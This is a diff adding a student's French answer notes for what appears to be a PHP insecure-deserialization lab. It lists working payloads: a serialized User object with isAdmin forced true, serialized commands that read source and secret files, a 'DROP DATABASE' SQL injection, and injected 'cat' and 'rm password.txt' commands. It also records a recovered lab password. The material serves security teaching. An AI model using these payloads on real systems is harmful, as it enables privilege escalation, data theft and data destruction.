@@ -1,0 +1,24 @@
+Exo 1 :
+1 : O:4:"User":4:{s:8:"username";s:4:"Test";s:3:"mdp";s:4:"test";s:7:"isAdmin";b:1;s :16:"adminAutoCommand";s:0:"";}
+on change le b:0 enn b:1 pour mettre l'user en admin avec le bool.
+
+2 : s:13:"echo 'PITIE';";}
+s:77:"echo htmlspecialchars(file_get_contents('./controller/BasicController.php'));";} 
+
+3 : s:74:"echo htmlspecialchars(file_get_contents('./secret-form-fordummies.txt'));";} 
+very-very-secret-form
+
+Injection sql
+
+any');DROP DATABASE tp_insecure_deserialization; --
+
+Exo 2 :
+
+1 : il exec un ls
+
+2 : addCommands("cat password.txt", "rm password.txt"); 
+si on veux le stocker on peut meme faire cat password.txt > newFile.txt
+
+3 : on trouve le mdp motdepasse123
+
+4 : 
